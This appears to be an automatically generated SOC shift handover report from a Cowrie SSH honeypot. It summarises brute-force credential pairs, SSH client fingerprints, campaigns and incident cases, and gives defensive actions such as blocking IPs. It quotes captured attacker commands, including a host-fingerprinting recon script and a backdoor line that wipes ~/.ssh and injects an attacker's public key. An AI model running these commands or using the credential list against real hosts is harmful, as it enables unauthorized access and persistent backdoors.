# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-05 |
| **Generated At** | 2026-08-05T17:45:15Z |
| **Shift Time** | 17:45 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **468** |
| Confirmed Threats | **413** |
| False Positives Filtered | **55** (11.8%) |
| Unique Attacker IPs | **155** |
| Countries of Origin | **36** |
| High Severity Cases | **180** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **288** |
| Malware Samples Analyzed | **3** HIGH · **27** MED · 16 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **207** |
| Unique Credential Pairs | **151** |
| Unique Usernames | **36** |
| Unique Passwords | **117** |
| Successful Auth Pairs | **183** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 71 |
| `admin` | 48 |
| `support` | 12 |
| `debian` | 10 |
| `deploy` | 10 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `admin` | 8 |
| `root` | 6 |
| `12345678` | 6 |
| `smo@@kkklss` | 6 |
| `LeitboGi0ro` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `admin` | `admin` | 6 |
| `root` | `smo@@kkklss` | 6 |
| `root` | `LeitboGi0ro` | 5 |
| `root` | `123@@@` | 5 |
| `root` | `root` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root1234` | `195.178.110.228` | 2026-08-05T12:56:24 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-08-05T12:57:43 |
| `root` | `123@@@` | `144.22.238.238` | 2026-08-05T12:57:44 |
| `root` | `root12345` | `195.178.110.228` | 2026-08-05T12:58:04 |
| `root` | `root123456` | `195.178.110.228` | 2026-08-05T12:59:42 |
| `root` | `root1234567` | `195.178.110.228` | 2026-08-05T13:01:13 |
| `n8n` | `admin` | `45.156.87.182` | 2026-08-05T13:02:14 |
| `root` | `root123456789` | `195.178.110.228` | 2026-08-05T13:02:41 |
| `zhangbr` | `` | `102.220.160.29` | 2026-08-05T13:04:00 |
| `root` | `root1234567890` | `195.178.110.228` | 2026-08-05T13:04:08 |
| `admin` | `1` | `195.178.110.228` | 2026-08-05T13:05:32 |
| `ubnt` | `ubnt2022` | `10.0.0.73` | 2026-08-05T13:05:58 |
| `support` | `support` | `10.0.0.73` | 2026-08-05T13:06:24 |
| `admin` | `12` | `195.178.110.228` | 2026-08-05T13:06:55 |
| `ubnt` | `123` | `113.140.95.2` | 2026-08-05T13:08:12 |
| `admin` | `123` | `195.178.110.228` | 2026-08-05T13:08:23 |
| `ubnt` | `123` | `177.72.87.7` | 2026-08-05T13:08:24 |
| `debian` | `debian10` | `103.230.176.152` | 2026-08-05T13:09:15 |
| `admin` | `1234` | `195.178.110.228` | 2026-08-05T13:09:52 |
| `admin` | `12345` | `195.178.110.228` | 2026-08-05T13:11:21 |
| `admin` | `123456` | `195.178.110.228` | 2026-08-05T13:12:50 |
| `admin` | `1234567` | `195.178.110.228` | 2026-08-05T13:14:25 |
| `admin` | `12345678` | `195.178.110.228` | 2026-08-05T13:16:03 |
| `admin` | `123456789` | `130.12.181.23` | 2026-08-05T13:16:06 |
| `root` | `end123` | `45.156.87.192` | 2026-08-05T13:16:19 |
| `root` | `share` | `130.12.181.21` | 2026-08-05T13:17:16 |
| `admin` | `123456789` | `195.178.110.228` | 2026-08-05T13:17:42 |
| `root` | `LeitboGi0ro` | `64.110.90.250` | 2026-08-05T13:18:15 |
| `root` | `123@@@` | `64.110.90.250` | 2026-08-05T13:18:15 |
| `ubnt` | `ubnt1` | `102.220.160.39` | 2026-08-05T13:18:28 |
| `jms` | `` | `130.12.181.23` | 2026-08-05T13:19:13 |
| `admin` | `1234567890` | `195.178.110.228` | 2026-08-05T13:19:23 |
| `admin` | `123qwe` | `195.178.110.228` | 2026-08-05T13:20:52 |
| `admin` | `123qwerty` | `195.178.110.228` | 2026-08-05T13:22:14 |
| `admin` | `21` | `195.178.110.228` | 2026-08-05T13:23:39 |
| `backuppc` | `backuppc` | `10.0.0.73` | 2026-08-05T13:24:12 |
| `admin` | `321` | `195.178.110.228` | 2026-08-05T13:25:07 |
| `admin` | `654321` | `195.178.110.228` | 2026-08-05T13:26:36 |
| `support` | `support66` | `112.30.127.9` | 2026-08-05T13:27:47 |
| `support` | `support66` | `164.164.117.23` | 2026-08-05T13:27:58 |
| `admin` | `Password` | `195.178.110.228` | 2026-08-05T13:28:10 |
| `admin` | `0000` | `101.13.5.26` | 2026-08-05T13:29:21 |
| `admin` | `admin` | `195.178.110.228` | 2026-08-05T13:29:42 |
| `admin` | `admin1` | `195.178.110.228` | 2026-08-05T13:31:20 |
| `user` | `Passw@rd` | `102.220.160.29` | 2026-08-05T13:32:31 |
| `admin` | `admin12` | `195.178.110.228` | 2026-08-05T13:32:57 |
| `admin` | `admin123` | `195.178.110.228` | 2026-08-05T13:34:33 |
| `root` | `ASD123` | `115.190.159.160` | 2026-08-05T13:35:04 |
| `admin` | `pa$w0rd` | `195.178.110.228` | 2026-08-05T13:36:08 |
| `admin` | `passw0rd` | `195.178.110.228` | 2026-08-05T13:37:45 |
| `admin` | `password` | `195.178.110.228` | 2026-08-05T13:39:24 |
| `admin` | `qwerty` | `195.178.110.228` | 2026-08-05T13:41:07 |
| `admin` | `0000` | `10.0.0.73` | 2026-08-05T13:41:16 |
| `backup` | `123qwe` | `195.178.110.228` | 2026-08-05T13:42:34 |
| `backup` | `54321` | `195.178.110.228` | 2026-08-05T13:43:59 |
| `ubuntu` | `ubuntu` | `178.128.80.167` | 2026-08-05T13:44:04 |
| `support` | `support66` | `136.185.6.181` | 2026-08-05T13:44:37 |
| `support` | `support66` | `117.70.94.155` | 2026-08-05T13:44:49 |
| `backup` | `backup` | `195.178.110.228` | 2026-08-05T13:45:23 |
| `admin` | `1234567890` | `130.12.182.110` | 2026-08-05T13:45:51 |
| `support` | `support` | `176.53.159.196` | 2026-08-05T13:46:45 |
| `backup` | `backup1` | `195.178.110.228` | 2026-08-05T13:46:50 |
| `ubuntu` | `qwer1234` | `178.128.80.167` | 2026-08-05T13:46:52 |
| `root` | `heartless` | `102.220.160.67` | 2026-08-05T13:46:57 |
| `user` | `user` | `64.89.162.146` | 2026-08-05T13:48:03 |
| `backup` | `backup12` | `195.178.110.228` | 2026-08-05T13:48:20 |
| `user` | `password` | `130.12.182.224` | 2026-08-05T13:48:22 |
| `admin` | `admin` | `13.140.178.221` | 2026-08-05T13:49:19 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-05T13:49:19 |
| `testuser` | `testuser` | `178.128.80.167` | 2026-08-05T13:49:38 |
| `backup` | `backup123` | `195.178.110.228` | 2026-08-05T13:49:50 |
| `backup` | `wasd` | `195.178.110.228` | 2026-08-05T13:51:21 |
| `miner` | `miner` | `178.128.80.167` | 2026-08-05T13:52:19 |
| `root` | `Netflix` | `102.220.160.42` | 2026-08-05T13:52:28 |
| `root` | `player9` | `102.220.160.67` | 2026-08-05T13:52:39 |
| `root` | `030488` | `130.12.182.110` | 2026-08-05T13:52:44 |
| `debian` | `123qwe` | `195.178.110.228` | 2026-08-05T13:52:51 |
| `root` | `ubuntu` | `203.189.196.168` | 2026-08-05T13:53:54 |
| `backupuser` | `root` | `45.156.87.182` | 2026-08-05T13:54:08 |
| `debian` | `54321` | `195.178.110.228` | 2026-08-05T13:54:18 |
| `rig` | `rig` | `178.128.80.167` | 2026-08-05T13:54:44 |
| `service` | `service` | `130.12.182.107` | 2026-08-05T13:54:56 |
| `debian` | `654321` | `195.178.110.228` | 2026-08-05T13:55:45 |
| `debian` | `debian` | `195.178.110.228` | 2026-08-05T13:57:14 |
| `xrig` | `xrig` | `178.128.80.167` | 2026-08-05T13:57:15 |
| `debian` | `debian12` | `195.178.110.228` | 2026-08-05T13:58:45 |
| `nobody` | `12345678` | `10.0.0.73` | 2026-08-05T13:59:11 |
| `admin` | `admin` | `159.65.138.39` | 2026-08-05T13:59:18 |
| `perl` | `perl` | `178.128.80.167` | 2026-08-05T13:59:48 |
| `debian` | `debian123` | `195.178.110.228` | 2026-08-05T14:00:13 |
| `debian` | `pa55word` | `195.178.110.228` | 2026-08-05T14:01:44 |
| `perlhash` | `perlhash` | `178.128.80.167` | 2026-08-05T14:02:25 |
| `debian` | `qwerty` | `195.178.110.228` | 2026-08-05T14:03:18 |
| `router` | `admin!@#` | `102.220.160.47` | 2026-08-05T14:03:53 |
| `admin` | `88888888` | `222.190.110.210` | 2026-08-05T14:04:14 |
| `admin` | `88888888` | `178.178.222.50` | 2026-08-05T14:04:28 |
| `deploy` | `1` | `195.178.110.228` | 2026-08-05T14:04:50 |
| `root` | `perl` | `178.128.80.167` | 2026-08-05T14:05:08 |
| `deploy` | `12` | `195.178.110.228` | 2026-08-05T14:06:22 |
| `CONNECT 130.12.182.224:80 HTTP/1.0` | `Host: 130.12.182.224:80` | `130.12.182.224` | 2026-08-05T14:07:14 |
| `hash` | `hash` | `178.128.80.167` | 2026-08-05T14:07:44 |
| `deploy` | `123` | `195.178.110.228` | 2026-08-05T14:07:54 |
| `test` | `123456` | `130.12.182.107` | 2026-08-05T14:09:19 |
| `deploy` | `1234` | `195.178.110.228` | 2026-08-05T14:09:29 |
| `admin` | `sawdust` | `64.89.161.91` | 2026-08-05T14:10:10 |
| `admin` | `admin` | `94.154.43.210` | 2026-08-05T14:10:30 |
| `deploy` | `12345` | `195.178.110.228` | 2026-08-05T14:11:02 |
| `nagios` | `so1Gan` | `64.89.161.91` | 2026-08-05T14:11:04 |
| `deploy` | `123456` | `195.178.110.228` | 2026-08-05T14:12:38 |
| `deploy` | `1234567` | `195.178.110.228` | 2026-08-05T14:14:14 |
| `deploy` | `12345678` | `195.178.110.228` | 2026-08-05T14:15:55 |
| `admin` | `88888888` | `10.0.0.73` | 2026-08-05T14:16:19 |
| `deploy` | `123456789` | `195.178.110.228` | 2026-08-05T14:17:34 |
| `root` | `12345678` | `45.156.87.182` | 2026-08-05T14:18:01 |
| `deploy` | `1234567890` | `195.178.110.228` | 2026-08-05T14:18:55 |
| `root` | `libreelec` | `218.4.156.254` | 2026-08-05T14:19:51 |
| `root` | `libreelec` | `36.93.154.207` | 2026-08-05T14:20:04 |
| `root` | `260787` | `94.26.106.19` | 2026-08-05T14:20:47 |
| `admin` | `12345678` | `45.156.87.182` | 2026-08-05T14:22:06 |
| `root` | `1qw2#ER$` | `185.158.22.150` | 2026-08-05T14:29:44 |
| `345gs5662d34` | `345gs5662d34` | `185.158.22.150` | 2026-08-05T14:29:47 |
| `root` | `3245gs5662d34` | `185.158.22.150` | 2026-08-05T14:29:48 |
| `root` | `Admin123@@` | `130.12.182.223` | 2026-08-05T14:31:58 |
| `ubnt` | `qwerty123456` | `10.0.0.73` | 2026-08-05T14:34:22 |
| `admin` | `77777777` | `10.0.0.73` | 2026-08-05T14:36:43 |
| `root` | `qazxsw!@#` | `125.124.183.254` | 2026-08-05T14:36:50 |
| `admin` | `77777777` | `120.234.195.41` | 2026-08-05T14:38:27 |
| `admin` | `77777777` | `201.28.237.90` | 2026-08-05T14:38:40 |
| `root` | `gabriela1` | `130.12.182.227` | 2026-08-05T14:42:48 |
| `root` | `hay123` | `130.12.181.23` | 2026-08-05T14:44:25 |
| `admin` | `admin01` | `130.12.182.230` | 2026-08-05T14:47:50 |
| `thembani` | `thembani` | `64.89.161.91` | 2026-08-05T14:51:21 |
| `root` | `654321` | `10.0.0.73` | 2026-08-05T14:51:47 |
| `ubnt` | `qwerty123456` | `182.79.218.164` | 2026-08-05T14:53:25 |
| `root` | `password` | `220.250.53.211` | 2026-08-05T15:01:39 |
| `roott` | `roott` | `45.156.87.165` | 2026-08-05T15:02:44 |
| `www` | `!QAZ2wsx` | `118.193.44.22` | 2026-08-05T15:09:04 |
| `345gs5662d34` | `345gs5662d34` | `118.193.44.22` | 2026-08-05T15:09:08 |
| `www` | `3245gs5662d34` | `118.193.44.22` | 2026-08-05T15:09:10 |
| `root` | `654321` | `122.187.237.122` | 2026-08-05T15:09:37 |
| `root` | `Tt123456` | `130.12.182.223` | 2026-08-05T15:12:58 |
| `root` | `witch1` | `102.220.160.39` | 2026-08-05T15:13:14 |
| `supervisor` | `5` | `182.156.35.238` | 2026-08-05T15:13:40 |
| `supervisor` | `5` | `116.72.9.151` | 2026-08-05T15:13:53 |
| `root` | `﻿------fuck------` | `45.126.120.53` | 2026-08-05T15:14:00 |
| `admin` | `admin11` | `60.172.54.36` | 2026-08-05T15:14:57 |
| `root` | `500062` | `102.220.160.47` | 2026-08-05T15:15:48 |
| `root` | `123@@@` | `129.153.145.135` | 2026-08-05T15:21:04 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-08-05T15:21:04 |
| `root` | `smo@@kkklss` | `129.153.145.135` | 2026-08-05T15:21:14 |
| `telecomadmin` | `admintelecom` | `102.220.160.67` | 2026-08-05T15:26:51 |
| `root` | `QWE@123` | `130.12.182.224` | 2026-08-05T15:27:23 |
| `supervisor` | `5` | `61.2.228.177` | 2026-08-05T15:30:16 |
| `ftp` | `ftp` | `45.153.34.226` | 2026-08-05T15:40:45 |
| `admin` | `admin11` | `114.30.223.119` | 2026-08-05T15:44:31 |
| `root` | `5` | `34.41.211.48` | 2026-08-05T15:48:40 |
| `admin` | `Admin123!` | `65.20.237.119` | 2026-08-05T15:49:58 |
| `admin` | `Admin123!` | `195.222.57.190` | 2026-08-05T15:50:05 |
| `root` | `maiden` | `130.12.182.224` | 2026-08-05T15:50:51 |
| `user` | `1234` | `45.153.34.226` | 2026-08-05T15:53:53 |
| `root` | `snowball11` | `64.89.161.91` | 2026-08-05T15:56:45 |
| `root` | `24682468` | `45.153.34.226` | 2026-08-05T15:56:52 |
| `ubuntu` | `data@123` | `64.89.161.91` | 2026-08-05T15:58:10 |
| `root` | `Mk43Lm21` | `45.156.87.192` | 2026-08-05T16:01:24 |
| `admin` | `Admin123!` | `10.0.0.73` | 2026-08-05T16:01:57 |
| `root` | `5` | `103.158.138.179` | 2026-08-05T16:05:31 |
| `postgres` | `666666` | `130.12.182.224` | 2026-08-05T16:17:49 |
| `root` | `alvina` | `45.153.34.226` | 2026-08-05T16:18:35 |
| `debian` | `123456789` | `10.0.0.73` | 2026-08-05T16:19:19 |
| `supervisor` | `supervisor` | `10.0.0.73` | 2026-08-05T16:22:00 |
| `harry` | `123` | `45.156.87.165` | 2026-08-05T16:23:28 |
| `root` | `!qaz3edc` | `130.12.181.21` | 2026-08-05T16:23:44 |
| `support` | `123321` | `151.237.170.49` | 2026-08-05T16:24:52 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-08-05T16:27:07 |
| `root` | `admin` | `38.148.20.90` | 2026-08-05T16:28:19 |
| `root` | `redhat123` | `102.220.160.39` | 2026-08-05T16:28:43 |
| `root` | `obinna` | `45.153.34.226` | 2026-08-05T16:32:20 |
| `support` | `123321` | `10.0.0.73` | 2026-08-05T16:36:49 |
| `root` | `petrovna` | `130.12.181.21` | 2026-08-05T16:40:43 |
| `root` | `2wsx#EDC` | `130.12.182.225` | 2026-08-05T16:44:43 |
| `root` | `Mm@123321` | `130.12.182.230` | 2026-08-05T16:49:52 |
| `root` | `Aa123456` | `45.153.34.226` | 2026-08-05T16:52:07 |
| `support` | `123321` | `207.254.71.129` | 2026-08-05T16:54:25 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **468** |
| Sessions with Fingerprint | **19** |
| Unique HASSH Fingerprints | **19** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 84 |
| Go SSH scanner | 75 |
| OpenSSH | 29 |
| Paramiko (Python) | 24 |
| PuTTY | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 55 | 1 |
| `a591c4ddccc9...` | Mirai/variant | 55 | 22 |
| `acaa53e0a7d7...` | Mirai/variant | 29 | 28 |
| `a2de0f306611...` | Mirai/variant | 16 | 3 |
| `16443846184e...` | Generic scanner | 10 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 55 | 1 | Mirai/variant |
| `a591c4ddccc9...` | libssh | 55 | 22 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 29 | 28 | Mirai/variant |
| `95420f9d932d...` | libssh | 18 | 9 | — |
| `a2de0f306611...` | Paramiko (Python) | 16 | 3 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 10 | 1 | Generic scanner |
| `f555226df196...` | libssh | 8 | 4 | Mirai/variant |
| `87e3d9ffee05...` | Paramiko (Python) | 8 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 55 | 1 | `T1082, T1592, T1078, T1083` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1082, T1592, T1105, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.228`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo SHELL_TEST
```
```
uname -m
```
```
cat /proc/cpuinfo
```
```
/bin/busybox TEST
```
```
cat /proc
```
Source IPs: `94.154.43.210`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `125.124.183.254`, `118.193.44.22`, `185.158.22.150`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **155** |
| Unique ASNs | **96** |
| High-Risk ASNs | **65** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS197769` | VPS Dedicated LLC | 14 | HIGH |
| `AS22773` | Cox Communications Inc. | 9 | MEDIUM |
| `AS197170` | TechTies Inc. | 6 | HIGH |
| `AS63949` | Akamai Connected Cloud | 5 | HIGH |
| `AS4134` | CHINANET BACKBONE | 5 | HIGH |
| `AS46562` | Performive LLC | 5 | MEDIUM |
| `AS48721` | Flyservers S.A. | 4 | HIGH |
| `AS398324` | Censys, Inc. | 4 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (180)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-24884378d685

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 12:56 |
| **Last Seen** | 2026-08-05 12:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 12:56:23` | `cowrie.session.connect` |
| `2026-08-05 12:56:23` | `cowrie.client.version` |
| `2026-08-05 12:56:23` | `cowrie.client.kex` |
| `2026-08-05 12:56:24` | `cowrie.login.success` |
| `2026-08-05 12:56:25` | `cowrie.session.params` |
| `2026-08-05 12:56:25` | `cowrie.command.input` |
| `2026-08-05 12:56:25` | `cowrie.command.input` |
| `2026-08-05 12:56:25` | `cowrie.command.input` |
| `2026-08-05 12:56:25` | `cowrie.command.input` |
| `2026-08-05 12:56:25` | `cowrie.command.input` |
| `2026-08-05 12:56:25` | `cowrie.command.success` |
| `2026-08-05 12:56:25` | `cowrie.command.input` |
| `2026-08-05 12:56:25` | `cowrie.command.input` |
| `2026-08-05 12:56:25` | `cowrie.command.input` |
| `2026-08-05 12:56:25` | `cowrie.command.input` |
| `2026-08-05 12:56:25` | `cowrie.log.closed` |
| `2026-08-05 12:56:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5cbef6737762

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-05 12:57 |
| **Last Seen** | 2026-08-05 12:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 12:57:43` | `cowrie.session.connect` |
| `2026-08-05 12:57:43` | `cowrie.client.version` |
| `2026-08-05 12:57:43` | `cowrie.client.kex` |
| `2026-08-05 12:57:43` | `cowrie.login.success` |
| `2026-08-05 12:57:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d149d1be3bb9

| Field | Detail |
|---|---|
| **Source IP** | `144.22.238[.]238` |
| **First Seen** | 2026-08-05 12:57 |
| **Last Seen** | 2026-08-05 12:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 12:57:43` | `cowrie.session.connect` |
| `2026-08-05 12:57:43` | `cowrie.client.version` |
| `2026-08-05 12:57:43` | `cowrie.client.kex` |
| `2026-08-05 12:57:44` | `cowrie.login.success` |
| `2026-08-05 12:57:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `144.22.238[.]238` to AbuseIPDB if not already reported
- [ ] Block `144.22.238[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19b2887ea2e9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 12:58 |
| **Last Seen** | 2026-08-05 12:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 12:58:03` | `cowrie.session.connect` |
| `2026-08-05 12:58:04` | `cowrie.client.version` |
| `2026-08-05 12:58:04` | `cowrie.client.kex` |
| `2026-08-05 12:58:04` | `cowrie.login.success` |
| `2026-08-05 12:58:05` | `cowrie.session.params` |
| `2026-08-05 12:58:05` | `cowrie.command.input` |
| `2026-08-05 12:58:05` | `cowrie.command.input` |
| `2026-08-05 12:58:05` | `cowrie.command.input` |
| `2026-08-05 12:58:05` | `cowrie.command.input` |
| `2026-08-05 12:58:05` | `cowrie.command.input` |
| `2026-08-05 12:58:05` | `cowrie.command.success` |
| `2026-08-05 12:58:05` | `cowrie.command.input` |
| `2026-08-05 12:58:05` | `cowrie.command.input` |
| `2026-08-05 12:58:05` | `cowrie.command.input` |
| `2026-08-05 12:58:05` | `cowrie.command.input` |
| `2026-08-05 12:58:05` | `cowrie.log.closed` |
| `2026-08-05 12:58:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ba0fab15e68

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-05 12:59 |
| **Last Seen** | 2026-08-05 12:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-05 12:59:41` | `cowrie.session.connect` |
| `2026-08-05 12:59:41` | `cowrie.client.version` |
| `2026-08-05 12:59:41` | `cowrie.client.kex` |
| `2026-08-05 12:59:42` | `cowrie.login.success` |
| `2026-08-05 12:59:43` | `cowrie.session.params` |
| `2026-08-05 12:59:43` | `cowrie.command.input` |
| `2026-08-05 12:59:43` | `cowrie.command.input` |
| `2026-08-05 12:59:43` | `cowrie.command.input` |
| `2026-08-05 12:59:43` | `cowrie.command.input` |
| `2026-08-05 12:59:43` | `cowrie.command.input` |
| `2026-08-05 12:59:43` | `cowrie.command.success` |
| `2026-08-05 12:59:43` | `cowrie.command.input` |
| `2026-08-05 12:59:44` | `cowrie.command.input` |
| `2026-08-05 12:59:44` | `cowrie.command.input` |
